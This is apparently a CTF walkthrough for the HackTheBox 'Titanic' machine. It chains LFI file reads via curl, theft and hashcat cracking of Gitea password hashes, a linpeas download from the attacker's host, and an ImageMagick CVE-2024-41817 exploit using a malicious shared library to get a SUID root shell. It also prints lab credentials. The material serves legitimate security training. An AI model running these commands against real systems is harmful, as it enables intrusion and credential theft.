# Titanic - Easy

```sh
sudo vim /etc/hosts
# map target IP to titanic.htb

nmap -T4 -p- -A -Pn -v titanic.htb
```

* open ports & services:

    * 22/tcp - OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
    * 80/tcp - Apache httpd 2.4.52

* the webpage on port 80 is for booking tickets to Titanic - and the only functionality working on the page is for the 'Book Now' option, which gives an input form

* web enumeration:

    ```sh
    gobuster dir -u http://titanic.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 25
    # simple directory scan

    ffuf -c -u "http://titanic.htb" -H "Host: FUZZ.titanic.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25
    # subdomain scan - find filter size

    ffuf -c -u "http://titanic.htb" -H "Host: FUZZ.titanic.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fw 20 -s
    # subdomain scan
    ```

* interesting pages:

    * /download - this mentions the 'ticket' parameter is required
    * /book - endpoint for booking tickets, we need to use POST requests

* using Burp Suite, intercept the POST request for the ticket booking form, fill in some values, and send to Repeater

* after we fill the form, we do a GET request to the /download endpoint, which downloads the ticket in JSON format - the name seems to be randomly generated

* we can save the POST request to a file and attempt to test for SQLi:

    ```sh
    sqlmap -r titanic.req --batch --dump
    ```

* ```sqlmap``` is unable to detect any injection points; we can simultaneously check for injection on the /download endpoint

* if we use a valid ticket number in the 'ticket' parameter in a GET request to this endpoint, we get a JSON response with the details

* attempting LFI here, if we feed in the path ```/etc/passwd``` instead of a ticket ID, it still works and fetches the file (if this would not have worked, next time would be to try LFI fuzzing):

    ```sh
    curl 'http://titanic.htb/download?ticket=/etc/passwd'
    ```

* output of ```/etc/passwd``` shows a user 'developer' is present on box; we can first try to see if there are any SSH keys for this user:

    ```sh
    curl 'http://titanic.htb/download?ticket=/home/developer/.ssh/id_rsa'

    curl 'http://titanic.htb/download?ticket=/home/developer/.ssh/authorized_keys'
    # this does not work
    ```

* to get a foothold from LFI to RCE, we can attempt log poisoning - we need to find out server log/config paths first:

    ```sh
    ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://titanic.htb/download?ticket=FUZZ' -fs 0 -fc 500
    # filtered empty responses and 500 server error pages as it was showing many of them
    # this gives multiple hits

    ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt:FUZZ -u 'http://titanic.htb/download?ticket=FUZZ' -fs 0 -fc 500
    ```

* the fuzzing shows that Apache is being used and the server config path is ```/etc/apache2/apache2.conf```:

    ```sh
    curl 'http://titanic.htb/download?ticket=/etc/apache2/apache2.conf'

    curl 'http://titanic.htb/download?ticket=/etc/apache2/envvars'

    curl 'http://titanic.htb/download?ticket=/var/log/apache2/error.log'
    # this does not work, even though the config says log file should be at this location
    ```

* meanwhile, the subdomain scan for the webpage gives us a subdomain 'dev.titanic.htb' - update the hosts entry:

    ```sh
    sudo vim /etc/hosts
    # add dev.titanic.htb
    ```

* this subdomain is running a Gitea instance, version 1.22.1, and it includes a 'Register' option so we can try creating a test account and signing in

* once signed in, checking the 'Explore' tab, we have two repositories for the 'developer' user - the same user found from ```/etc/passwd``` earlier - and we can check both these repos for any secrets

* the first repo is 'flask-app', and it is the webpage source code; no clues found in code or commit history

* the second repo is 'docker-config', and this includes Docker Compose YAML files for two instances - Gitea and MySQL

* from this repo, we get the MySQL user 'sql_svc' and password 'MySQLP@$$w0rd!'; and the path ```/home/developer/gitea/data``` is also disclosed, which could have Gitea config files

* Googling for Gitea config files location gives us a few possible path variations like ```/etc/gitea/conf/app.ini``` and ```/data/gitea/conf/app.ini```

* combining the two paths (the Gitea path and the config file path), we can check these possible paths for the ```app.ini``` file:

    ```sh
    curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/app.ini'
    # not found

    curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/conf/app.ini'
    # not found

    curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini'
    # this works
    ```

* the ```app.ini``` file shows that the Gitea instance is running on a sqlite DB, and also provides the DB path as ```/data/gitea/gitea.db``` - we can attempt to fetch the file:

    ```sh
    curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' --output gitea.db

    # open the DB
    sqlitebrowser gitea.db
    ```

* in this DB, checking the table data, the 'user' table gives password hashes for users 'administrator' and 'developer', and also includes salts for these hashes; and also mentions the password hash algo as 'pbkdf2$50000$50' - which is also mentioned in Gitea docs (pbkdf2_v2 hash algo)

* this logic is discussed in [this blog](https://www.unix-ninja.com/p/cracking_giteas_pbkdf2_password_hashes); essentially, Gitea uses PBKDF2-HMAC-SHA256 (for pbkdf2_v2), ```hashcat``` mode 10900, and is expected in a specific format (base64-encoded)

* using the [gitea2hashcat.py](https://github.com/hashcat/hashcat/blob/master/tools/gitea2hashcat.py) tool, we can convert these hashes for both 'administrator' & 'developer' users:

    ```sh
    python3 gitea2hashcat.py cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136:2d149e5fbd1b20cf31db3e3c6a28fc9b
    # for 'administrator'

    python3 gitea2hashcat.py e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56:8bf3e3452b78544f8bee9400d6936d34
    # for 'developer'

    vim giteahashes
    # paste both generated hashes

    hashcat -m 10900 giteahashes /usr/share/wordlists/rockyou.txt --force
    ```

* ```hashcat``` is able to crack 'developer' hash and gives cleartext password '25282528' - so we can try to login using this:

    ```sh
    ssh developer@titanic.htb
    # this works

    cat user.txt
    # user flag

    sudo -l
    # not working

    # we can do basic enum using linpeas

    # fetch linpeas from attacker
    wget http://10.10.14.21:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * box running Linux version 5.15.0-131-generic, Ubuntu 22.04.5
    * env PATH includes writable path ```/home/developer/.local/bin```
    * ```/opt/``` includes some scripts and app files
    * ```/opt/app/static/assets/images/metadata.log``` is updated recently

* checking under ```/opt```, there is an interesting script at ```/opt/scripts/identify_images.sh```, and it is referencing another file which seems to be updated regularly

* ```pspy``` does not show any cronjob running so we have to verify manually:

    ```sh
    ls -la /opt/app/static/assets/images/
    # this shows the file 'metadata.log' is being updated every minute

    ls -la /opt/scripts
    # we do not have write permissions to this script

    cat /opt/scripts/identify_images.sh
    # this is the script updating 'metadata.log'
    ```

    ```sh
    cd /opt/app/static/assets/images
    truncate -s 0 metadata.log
    find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
    ```

* this is what the 'identify_images.sh' script does:

    * move to the images directory
    * empty the 'metadata.log' file by setting its size to 0
    * searches directory recursively for JPG files
    * passes the list of JPG files to ImageMagick ```identify``` tool
    * ```identify``` extracts the image metadata and appends the output to 'metadata.log'

* Googling for privesc exploits associated with ImageMagick tool leads to an arbitrary code executation vuln [CVE-2024-41817](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8) - we can follow the given PoC to exploit this:

    ```sh
    magick --version
    # confirm ImageMagick version is affected

    # move to target directory
    cd /opt/app/static/assets/images

    # create the shared library
    # in this case, we can make a copy of bash and set SUID bit

    gcc -x c -shared -fPIC -o ./libxcb.so.1 - <<EOF
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    
    __attribute__((constructor)) void init(){
        system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash");
        exit(0);
    }
    EOF

    # after a minute or two of cronjob running imagemagick, check if the binary is ready
    ls -la /tmp/bash
    # it is having SUID bit set

    /tmp/bash -p
    # root shell

    cat /root/root.txt
    # root flag
    ```
